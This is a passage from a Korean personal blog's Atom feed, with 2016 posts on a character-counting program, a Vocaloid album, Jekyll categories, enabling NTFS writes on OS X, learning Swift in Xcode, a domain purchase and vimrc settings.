   <content type="html">&lt;p&gt;고등학교 2학년 때, 대입 원서를 쓸 당시 너무나도 딴짓이 하고 싶었던 나머지 자기 소개서의 글자 수를 세 주는 프로그램을 만들었는데, 어쩌다 보니 다음 해, 다다음 해에도 이 프로그램을 찾아주는 후배님들이 계셔서, 몇 달 전에 웹 페이지를 따로 제작하여 프로그램에 대한 정리와 함께 올려 두었다.&lt;/p&gt;

&lt;p&gt;당시 하나도 모르던 C#(지금도 하나도 모른다)을 여기저기 구글링하면서 짠 프로그램이라, 꽤 엉성하다.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://jagi.gaonnr.me&quot;&gt;자기소개서 글자 수 세기&lt;/a&gt;&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_09/jagi_count.png&quot; style=&quot;width: 640px;&quot; /&gt;
&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>八王子P 베스트 앨범 [Eight - The Best of 八王子P] 구매</title>
   <link href="https://blog.gaonnr.me/otaku/2016/06/30/Eight-Album/"/>
   <updated>2016-06-30T00:00:00+09:00</updated>
   <id>https://blog.gaonnr.me/otaku/2016/06/30/Eight-Album</id>
   <content type="html">&lt;p&gt;몇 주 전에 하치오지P(八王子P)의 베스트 앨범이 발매된다는 소식을 들었다. 원래 그렇게 좋아하는 보컬로이드 프로듀서는 아니었지만, 저번 삿포로 여행에서 DJ Live에 참가하고 나서 호감을 가지게 되어 심심할 때마다 음악을 듣고 있었는데, 베스트 앨범이 발매된다고 하길래 조금의 고민 끝에 구매를 결정했다.&lt;/p&gt;

&lt;p&gt;초회한정판과 일반판 두 가지로 나뉘어 발매되었는데, 앨범 일러스트가 다르고, 초회한정판에는 주요 곡들의 PV가 담긴 DVD가 동봉되어 있다. 본인은 초회한정판을 구매했다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
    &lt;img src=&quot;/images/2016_07/01.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
    &lt;img src=&quot;/images/2016_07/02.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
    &lt;span class=&quot;italics&quot;&gt;앨범의 모습. 사진으론 모르겠지만 꽤 두껍다.&lt;/span&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
    &lt;img src=&quot;/images/2016_07/03.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
    &lt;img src=&quot;/images/2016_07/04.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
    &lt;span class=&quot;italics&quot;&gt;뜯어보면 요래 생겼다. 미쿠 말고도 구미 일러스트가 보인다. 초회한정판이라 CD는 총 3개이다.&lt;/span&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
    &lt;img src=&quot;/images/2016_07/05.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
    &lt;span class=&quot;italics&quot;&gt;사실 기본판보다 일러스트가 더 취향이라서 초회한정판을 샀다.... DVD 화질이 그리 좋은 것도 아니고 사실 유튜브 공식 채널에 PV는 다 올라와 있다.&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;베스트 앨범이다 보니 곡이 많은데, ‘BLACK STAR’와 ‘WHITE MOON’이라고 이름붙여진 두 개의 CD에 나뉘어 수록되어 있다. CD에 들어간 곡들의 분위기에 맞게 이름을 붙인 느낌이다.
총 36곡이며, 리스트는 다음과 같다.&lt;/p&gt;

&lt;p&gt;```
★BLACK STAR
01      気まぐれメルシィ feat. 初音ミク
02      Sweet Devil -Eight Mix- feat. 初音ミク
03      Baby Maniacs -Eight Mix- feat. 初音ミク
04      fake doll feat. 初音ミク
05      Little Scarlet Bad Girl feat. 初音ミク
06      Carry Me Off feat. 初音ミク
07      KiLLER LADY -Eight Mix- feat. GUMI
08      GAME OVER feat. 初音ミク
09      Heart Chrome feat. 杏音鳥音
10      Mad Lovers -Eight Mix- feat. 巡音ルカ
11      Free -Eight Mix- feat. 巡音ルカ
12      candii -Eight Mix- feat. 初音ミク
13      REWRITER feat. GUMI
14      rock -Eight Mix- feat. 初音ミク・巡音ルカ
15      Distorted Princess -Eight Mix- feat. 初音ミク・巡音ルカ
16      Dream Creator feat. GUMI
17      Beautiful Nightmare feat. 巡音ルカ
18      Queen of the Night feat. 初音ミク・巡音ルカ&lt;/p&gt;

&lt;p&gt;☆WHITE MOON&lt;/p&gt;

&lt;p&gt;01      Blue Star feat. 初音ミク
02      Weekender Girl feat. 初音ミク
03      エレクトリック・ラブ -Eight Mix- feat. 初音ミク
04      デスクトップ・シンデレラ feat. 初音ミク
05      Twinkle World feat. 初音ミク
06      HORIZON feat. 初音ミク
07      シューティングスター feat. 鏡音リン・鏡音レン
08      Keep Only One Love -Eight Mix- feat. 初音ミク
09      Tomorrow feat. 初音ミク
10      TRAP × TRAP feat. 初音ミク
11      エレクトリック・スター -Eight Mix- feat. GUMI
12      FUTURE DRIVER feat. 初音ミク
13      エレクトリック・マジック feat. 鏡音リン・鏡音レン
14      whiteout -Eight Mix- feat. 初音ミク
15      フカヨミ feat. 初音ミク
16      弱虫ロケット feat. 初音ミク
17      Yeah! Yeah!! Yeah!!! feat. 初音ミク
18      Step To Tomorrow feat. 初音ミク・鏡音リン・鏡音レン・巡音ルカ・GUMI
```&lt;/p&gt;

&lt;p&gt;막귀라서 함부로 평을 내릴 수는 없지만, 개인적으론 퀄리티 높고 괜찮은 앨범이라고 생각한다.
개인적으로 괜찮았던 몇 곡의 PV를 아래에 링크시켜 놓았다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/o1iz4L-5zkQ&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
&lt;span class=&quot;italics&quot;&gt;1. 気まぐれメルシィ(변덕 메르시) feat. 初音ミク&lt;/span&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/Kobrtyw97kU&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
&lt;span class=&quot;italics&quot;&gt;2. Beautiful Nightmare feat. 巡音ルカ&lt;/span&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/sK92X82T3Sk&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
&lt;span class=&quot;italics&quot;&gt;3-1. Blue Star feat. 初音ミク (MIKU EXPO ver.)&lt;/span&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/xSnuVnOZd1U&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
&lt;span class=&quot;italics&quot;&gt;3-2. Blue Star feat. 初音ミク&lt;/span&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/rQCPXcckCaQ&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
&lt;span class=&quot;italics&quot;&gt;4. デスクトップ・シンデレラ(데스크톱 신데렐라) feat. 初音ミク&lt;/span&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/I_bs61WyzMk&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
&lt;span class=&quot;italics&quot;&gt;5. Little Scarlet Bad Girl feat. 初音ミク&lt;/span&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/UGG7tUMg77A&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
&lt;span class=&quot;italics&quot;&gt;6. Carry Me Off feat. 初音ミク&lt;/span&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/06d8SwcSm_Q&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
&lt;span class=&quot;italics&quot;&gt;7. Weekender Girl feat. 初音ミク&lt;/span&gt;
&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>블로그에 Category 기능을 적용</title>
   <link href="https://blog.gaonnr.me/setting/2016/05/07/Added-Category-Function-To-Blog/"/>
   <updated>2016-05-07T00:00:00+09:00</updated>
   <id>https://blog.gaonnr.me/setting/2016/05/07/Added-Category-Function-To-Blog</id>
   <content type="html">&lt;p&gt;블로그의 글 개수가 점점 많아짐에 따라, Jekyll의 category 기능을 이용하여 포스트들을 정리해 보기로 했다.&lt;/p&gt;

&lt;p&gt;기본적으로 &lt;a href=&quot;http://stackoverflow.com/questions/20872861/jekyll-display-posts-by-category&quot;&gt;이곳&lt;/a&gt;의 YAML 코드를 참고하여 작성하였다.&lt;/p&gt;

&lt;p&gt;작성된 결과물은 오른쪽 상단의 햄버거 메뉴를 누르면 나오는 Archives 페이지에 반영되었으며, 코드는 다음과 같다. (&lt;a href=&quot;https://github.com/GAONNR/GAONNR.github.io&quot;&gt;Github - gaonnr.github.io&lt;/a&gt;의 archive.md에서 텍스트로 볼 수 있다)&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/CategorySource.png&quot; style=&quot;width: 640px;&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;코드의 원리는 대강 이해할 수 있었지만, CSS를 아직 감을 잡지 못해서, 야매로 이것저것 바꿔보면서 스타일을 적용하느라 애먹었다.&lt;br /&gt;
아직도 썩 맘에 드는 디자인을 만들진 못했지만, 이 정도로 만족하고 좀 더 생산적인 일을 해야겠다.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>OS X에서 NTFS 사용하기 - OSXfuse, ntfs-3g</title>
   <link href="https://blog.gaonnr.me/setting/2016/05/06/Using-NTFS-On-OSX/"/>
   <updated>2016-05-06T00:00:00+09:00</updated>
   <id>https://blog.gaonnr.me/setting/2016/05/06/Using-NTFS-On-OSX</id>
   <content type="html">&lt;p&gt;OS X는 공식적으로 NTFS를 지원하지 않는다. 그러나 시중에 나와있는 외장
하드디스크들은 대부분 NTFS 포맷이므로, 대용량 자료들을 복사하기 위해서는 NTFS
지원이 필요한 것이 사실이다. 본인은 최근까지
&lt;a href=&quot;http://enjoygineering.com/mounty/&quot;&gt;Mounty&lt;/a&gt;라는 3rd-party 프로그램을 사용하고
있었으나, 매번 하드디스크를 연결할 때마다 Notification Popup이 떠서 번거롭기도
했고, 몇 번 하드디스크에 에러를 발생시키기도 해서 다른 프로그램을 찾던 도중,
OSXfuse와 ntfs-3g를 사용하여 NTFS로 디스크를 자동으로 mount하는 법을 발견하여
시도해 보기로 했다. 비록 초기 설정은 Mounty에 비해 번거롭고, Command Line을
사용하여 복잡해 보일 수도 있지만, 설정만 끝내면 그 이후론 별로 신경을 쓰지
않아도 되어서 깔끔하니 좋은 것 같다.&lt;/p&gt;

&lt;p&gt;먼저 homebrew가 깔려 있다는 가정 하에 설명을 진행하겠다. 만약 homebrew가
깔려있지 않다면, 적절한 검색을 통해 찾아보길 권한다.&lt;/p&gt;

&lt;p&gt;우선 다음 링크에서 &lt;a href=&quot;https://github.com/osxfuse/osxfuse/releases&quot;&gt;OSXfuse&lt;/a&gt;를
다운로드 받아 설치하자.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
    &lt;img src=&quot;/images/Using_NTFS_on_OSX/01.png&quot; style=&quot;width:
    640px;&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;링크를 타고 들어가서, 조금 스크롤을 내리면 보이는 Downloads 항목에서
osxfuse-3.2.0.dmg 파일을 다운로드 받아 설치하면 된다.&lt;/p&gt;

&lt;p&gt;이후 터미널을 켜고 다음과 같은 명령어를 입력하여 homebrew를 설치하자.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
brew install homebrew/fuse/ntfs-3g
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;설치가 끝나면, 외장 하드디스크가 연결되었을 때 자동으로 mount하도록 설정을
해줘야 하는데, El Capitan 이후로는 시스템의 일부 영역이 Root라고 할지라도 수정을
할 수 없게 막혀 있다. 따라서 &lt;a href=&quot;http://macnews.tistory.com/3408&quot;&gt;이 포스트&lt;/a&gt;를
참고하여 Rootless를 해제하자. 부팅할 때 Cmd + R을 꾹 누르고 있으면 Recovery
모드로 진입하며, 상단의 메뉴 막대에서 유틸리티 - 터미널을 선택하고, 다음
명령어를 입력한다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
csrutil disable --without debug
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;이제 Rootless의 해제가 완료되었다. 다시 정상적으로 부팅한 후 터미널을 켜서
다음의 두 줄을 입력하자.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
sudo mv /sbin/mount_ntfs /sbin/mount_ntfs.original
sudo ln -s /usr/local/sbin/mount_ntfs /sbin/mount_ntfs
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;이후 컴퓨터를 재부팅한 후 외장 하드디스크를 연결해 보면, 자동으로 NTFS로
mount되어 쓰기가 가능해진 것을 확인할 수 있다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
    &lt;img src=&quot;/images/Using_NTFS_on_OSX/02.png&quot; style=&quot;width:
    640px;&quot; /&gt;
&lt;/p&gt;

&lt;p class=&quot;italics&quot; align=&quot;CENTER&quot;&gt;
이 포스트의 내용은 &lt;a href=&quot;http://www.howtogeek.com/236055/how-to-write-to-ntfs-drives-on-a-mac/&quot;&gt;이
링크&lt;/a&gt;에서 일부를 참고하여 작성되었습니다.
&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>XCode의 playground를 이용하여 Swift 학습하기, 터미널(terminal)을 통해 Swift 코드 실행시키기</title>
   <link href="https://blog.gaonnr.me/development/2016/04/18/Using-Swift-With-XCode-Playground/"/>
   <updated>2016-04-18T00:00:00+09:00</updated>
   <id>https://blog.gaonnr.me/development/2016/04/18/Using-Swift-With-XCode-Playground</id>
   <content type="html">&lt;p&gt;&lt;span class=&quot;italics&quot;&gt; 이 글은 OS X, El Capitan, Swift 2.2 환경에서 작성되었습니다.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;최근 동아리가 출전한 pCTF 2016에서 Swift언어로 된 문제가 출제되었다.&lt;br /&gt;
아무래도 최근 구글에서 Go는 서버 개발 위주로 활용하고, 안드로이드 등에 Swift를 활용하는 것을 고려중이라는 소문이 반영된 듯 하다.&lt;br /&gt;
Go 배우기도 바빴던 동아리원들인데, 갑자기 Swift로 태세전환이라니 허탈감이 들지 않을 수가 없다.&lt;br /&gt;
그래도 Swift는 애플에서 하도 홍보를 해와서 흥미가 있었던 언어이기도 했고, 마침 또 중간고사 시험기간의 버프로 인해 Swift에 대한 호기심이 차올라 대강 배워보기로 했다.&lt;/p&gt;

&lt;p&gt;Swift가 최근에 Open-Source로 공개되긴 했지만, 역시 애플에서 만든 언어인 만큼 XCode에서 제대로 쓸 수 있을 것이다.
XCode를 실행하면 다음과 같은 화면이 나온다.&lt;/p&gt;
&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/Learning-Swift/Start_Swift.png&quot; style=&quot;width: 640px;&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;여기서 &lt;code class=&quot;highlighter-rouge&quot;&gt;Get started with a playground&lt;/code&gt;를 눌러주자. 그러면 다음과 같은 화면이 나타난다.&lt;/p&gt;
&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/Learning-Swift/Playground.png&quot; style=&quot;width: 640px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;Playground의 모습. 안에 쓰여 있는 코드는 본인이 임의로 작성한 것이다.&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;Playground에 적힌 모든 Swift 코드는 실시간으로 컴파일되어 실행되며, 그 결과값이 오른쪽과 아래에 나타난다. 직관적이므로 몇 번 타이핑해보면 쉽게 이해할 수 있다.
한 줄 한 줄 빠르게 실행이 되길래 python과 같은 interpreter언어인 줄 알았는데, Obj-C처럼 기계어로 compile한다고 한다. 뒤에서 설명하겠지만, 터미널에서 swift source.swift 명령어를 이용하여 소스 파일을 실행시킬 수 있는데, 이것도 python 등의 interpreter언어와 유사하다. 신기한 언어인 것 같다.&lt;/p&gt;

&lt;p&gt;문법은 좀 더 깊게 배워봐야 알겠지만 전반적으로 python과 C 계통의 언어를 적당히 짬뽕한 느낌이다.&lt;br /&gt;
보통 C 계열에서 영향을 받은 언어들은 변수를 선언할 때 int, char, … 등등을 사용하는데 Swift는 조금 다르다.&lt;br /&gt;
상수를 선언할 때는 &lt;code class=&quot;highlighter-rouge&quot;&gt;let&lt;/code&gt; 키워드를 사용하며, 변수를 선언할 때는 &lt;code class=&quot;highlighter-rouge&quot;&gt;var&lt;/code&gt; 키워드를 사용한다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Swift
let constInt = 20
var variables = 30
var doublePi = 3.14
let str = &quot;IamString&quot;
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;이렇게 선언할 수 있으며, 문장의 끝에 세미콜론(;)은 찍어도 되고, 찍지 않아도 된다.&lt;/p&gt;

&lt;p&gt;이렇게 상수나 변수를 선언할 때, 특정 타입을 명시하여 선언할 수도 있으며, 이는 다음과 같이 하면 된다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Swift
var testString : String
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Double()&lt;/code&gt; 등을 통해 서로 간에 형변환을 할 수도 있다.&lt;/p&gt;

&lt;p&gt;이제 Hello, World!를 출력해 보자. Swift에서는 &lt;code class=&quot;highlighter-rouge&quot;&gt;print()&lt;/code&gt; 함수가 stdout을 담당한다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Swift
print(&quot;Hello, World!&quot;)
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;위의 코드를 입력하면 왼쪽과 아래쪽의 창에 “Hello, World!”가 나타날 것이다.&lt;/p&gt;

&lt;p&gt;Swift에서 &lt;code class=&quot;highlighter-rouge&quot;&gt;for&lt;/code&gt;문을 선언하는 방법은 다음과 같다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Swift
for i in 1..&amp;lt;10 {
  //Source
}
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;python의 &lt;code class=&quot;highlighter-rouge&quot;&gt;for i in range(1, 10)&lt;/code&gt;과 같은 기능을 실행한다. 개인적으로는 저 ..&amp;lt; 기호가 맘에 들지 않지만, 문법이므로 익숙해지려고 노력하고 있다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;print()&lt;/code&gt; 함수와 &lt;code class=&quot;highlighter-rouge&quot;&gt;for&lt;/code&gt;문을 적당히 사용하여 구구단을 출력하는 코드를 작성해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Swift
for i in 1..&amp;lt;10 {
    for j in 1..&amp;lt;10 {
        var temp = i * j
        print(i, &quot;*&quot;, j, &quot;=&quot;, temp)
    }
}
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;이제 stdin을 통하여 입력에 따라 출력값이 변하는 코드를 짜 보려고 했지만, playground에서는 stdin을 지원하지 않는 것 같다. 그래서 터미널을 통해 standard input을 받아보기로 했다.&lt;/p&gt;

&lt;p&gt;터미널을 열어서 swift를 입력했더니 다음과 같은 에러 메시지가 표시되었다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/Learning-Swift/Error_Msg.png&quot; style=&quot;width: 640px&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;module six가 없다는 에러 메시지가 표시된다.&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;이는 &lt;code class=&quot;highlighter-rouge&quot;&gt;brew install python&lt;/code&gt; – &lt;code class=&quot;highlighter-rouge&quot;&gt;brew link python&lt;/code&gt; – &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo easy_install pip&lt;/code&gt; – &lt;code class=&quot;highlighter-rouge&quot;&gt;pip install six&lt;/code&gt; 의 커맨드를 순서대로 입력하여 해결할 수 있었다.&lt;/p&gt;

&lt;p&gt;이후 다시 swift를 터미널에 입력하면 다음과 같이 swift가 실행된다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/Learning-Swift/Launched_Swift.png&quot; style=&quot;width: 640px&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;Swift가 정상적으로 실행된 모습.&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;여기서 python처럼 코드를 직접 타이핑할 수도 있지만, 소스 파일을 따로 만들어서 실행해 보기로 결정하였다.
&lt;code class=&quot;highlighter-rouge&quot;&gt;:quit&lt;/code&gt;를 입력하여 Swift를 종료한 후, vim을 통해 SwiftTest.swift 파일을 만들어 다음과 같이 입력하였다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Swift
print(&quot;What is your name?&quot;)
let name = readLine(stripNewline: true)
print(&quot;Your name is&quot;, name!)
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;3번째 줄에서 name 뒤에 !가 붙은 이유는 Swift만의 자료형인 Optional이 같이 출력되는 것을 막기 위해서인데. 이는 나중에 기회가 되면 설명하겠다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Swift
print(&quot;Your name is \(name!)&quot;)
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;위 코드 또한 같은 결과를 출력한다. C언어의 %d, %s, … 등등의 Format String 개념이라고 보면 되겠다.
이를 저장한 후, &lt;code class=&quot;highlighter-rouge&quot;&gt;swift SwiftTest.swift&lt;/code&gt;를 입력하면 코드가 실행된다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/Learning-Swift/Result.png&quot; style=&quot;width: 640px&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;입력한 String이 정상적으로 출력되는 것을 확인할 수 있다.&lt;/span&gt;
&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>gaonnr.me 도메인 구매</title>
   <link href="https://blog.gaonnr.me/setting/2016/04/15/bought-domain/"/>
   <updated>2016-04-15T00:00:00+09:00</updated>
   <id>https://blog.gaonnr.me/setting/2016/04/15/bought-domain</id>
   <content type="html">&lt;p&gt;원격 접속 및 블로그 리다이렉트용으로 사용하기 위해서 도메인을 구입하였다.&lt;br /&gt;
사실 miku.moe(…)를 구매하려고 했지만, 누군가가 이미 사서 개발중이라길래 눈물을 머금고 관뒀다.&lt;br /&gt;
moe 도메인 다음으로 탐났던 도메인이 .me 도메인인 관계로 &lt;a href=&quot;https://kr.godaddy.com/&quot;&gt;GoDaddy&lt;/a&gt;에서 gaonnr.me 도메인을 구매하였다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/Bought-Domain/GoDaddy.png&quot; style=&quot;width: 640px;&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;도메인을 구매한 후, &lt;a href=&quot;https://www.cloudflare.com/&quot;&gt;CloudFlare&lt;/a&gt;로 이동하여 네임서버를 등록하고, ssh는 원격 접속용으로, &lt;a href=&quot;https://gaonnr.me/blog&quot;&gt;gaonnr.me/blog&lt;/a&gt;는 현재 이 블로그로 리다이렉트되도록 설정하였다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/Bought-Domain/CloudFlare.png&quot; style=&quot;width: 640px;&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://gaonnr.github.io&quot;&gt;gaonnr.github.io&lt;/a&gt; 보다는 좀더 짧고 깔끔한 도메인인 것 같아 기분이 좋다.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>vimrc 설정하기 - 기본 설정 및 Plugin</title>
   <link href="https://blog.gaonnr.me/development/2016/03/15/setting-vimrc/"/>
   <updated>2016-03-15T00:00:00+09:00</updated>
   <id>https://blog.gaonnr.me/development/2016/03/15/setting-vimrc</id>
   <content type="html">&lt;p&gt;동아리에서 새로 판 서버에다 지금까지 로컬에서 썼던 &lt;code class=&quot;highlighter-rouge&quot;&gt;.vimrc&lt;/code&gt;파일을 옮기려다가 mv대신 rm을 써서 날려먹었다.&lt;/p&gt;

&lt;p&gt;어디 백업해 놓은 것도 없었기 때문에 어쩔 수 없이 새로 작성하는 겸, 내가 사용하는 설정을 정리해서 올리기로 했다.&lt;/p&gt;

&lt;p class=&quot;italics&quot;&gt;이 글은 OS X (El Capitan) 기준으로 작성되었습니다.&lt;/p&gt;

&lt;p&gt;먼저 root폴더에다 (일반적으로, 터미널을 켜면 바로 나오는 폴더이다) &lt;code class=&quot;highlighter-rouge&quot;&gt;.vimrc&lt;/code&gt; 파일을 생성하자. &lt;code class=&quot;highlighter-rouge&quot;&gt;vim .vimrc&lt;/code&gt; 명령어로 쉽게 생성할 수 있다.
그 후 원하는 세팅을 적은 다음 저장하면, vim에 즉각 반영된다.&lt;/p&gt;

&lt;p&gt;우선 기본 세팅들. 각 세팅들이 무슨 역할을 하는지는 옆의 주석을 통해 알 수 있다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;set hlsearch &quot; 검색어 하이라이팅
set nu &quot; 줄번호
set autoindent &quot; 자동 들여쓰기
set scrolloff=2
set wildmode=longest,list
set ts=4 &quot;tag select
set sts=4 &quot;st select
set sw=1 &quot; 스크롤바 너비
set autowrite &quot; 다른 파일로 넘어갈 때 자동 저장
set autoread &quot; 작업 중인 파일 외부에서 변경됬을 경우 자동으로 불러옴
set cindent &quot; C언어 자동 들여쓰기
set bs=eol,start,indent
set history=256
set laststatus=2 &quot; 상태바 표시 항상
&quot;set paste &quot; 붙여넣기 계단현상 없애기
set shiftwidth=4 &quot; 자동 들여쓰기 너비 설정
set showmatch &quot; 일치하는 괄호 하이라이팅
set smartcase &quot; 검색시 대소문자 구별
set smarttab
set smartindent
set softtabstop=4
set tabstop=4
set ruler &quot; 현재 커서 위치 표시
set incsearch
set statusline=\ %&amp;lt;%l:%v\ [%P]%=%a\ %h%m%r\ %F\
&quot; 마지막으로 수정된 곳에 커서를 위치함
au BufReadPost *
\ if line(&quot;&#39;\&quot;&quot;) &amp;gt; 0 &amp;amp;&amp;amp; line(&quot;&#39;\&quot;&quot;) &amp;lt;= line(&quot;$&quot;) |
\ exe &quot;norm g`\&quot;&quot; |
\ endif
&quot; 파일 인코딩을 한국어로
if $LANG[0]==&#39;k&#39; &amp;amp;&amp;amp; $LANG[1]==&#39;o&#39;
  set fileencoding=korea
endif
&quot; 구문 강조 사용
if has(&quot;syntax&quot;)
  syntax on
endif
&quot; 컬러 스킴 사용
colorscheme Tomorrow-Night-Eighties
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p class=&quot;italics&quot; align=&quot;CENTER&quot;&gt;위 세팅들은 구글 검색을 통해 &lt;a href=&quot;https://medium.com/sunhyoups-story/vim-%EC%97%90%EB%94%94%ED%84%B0-%EC%9D%B4%EC%81%98%EA%B2%8C-%EC%82%AC%EC%9A%A9%ED%95%98%EA%B8%B0-5b6b8d546017#.sg39ixinw&quot;&gt;이선협 님의 블로그&lt;/a&gt;에서 가져온 것입니다.&lt;/p&gt;

&lt;p&gt;vim의 colorscheme은 &lt;a href=&quot;http://cocopon.me/app/vim-color-gallery/&quot;&gt;이곳&lt;/a&gt;에서 내려받을 수 있다. 마음의 드는 테마를 내려받아 &lt;code class=&quot;highlighter-rouge&quot;&gt;.vim/colors&lt;/code&gt; 폴더에 복사하자. vimrc에서 설정할 colorscheme의 이름을 입력하면 된다. 본인은 Tomorrow-Night-Eighties colorscheme을 사용중이다.
set paste의 경우 주석처리가 되어 있는데, set paste를 활성화하면 자동 들여쓰기가 안 되는 경우가 생기니 유의해서 주석을 해제해 사용하도록 하자.&lt;/p&gt;

&lt;p&gt;이후에는 vim을 다른 화려한 IDE나 Text Editor 못지않게 만들어 줄 수 있는 여러 플러그인을 설치할 수 있다.
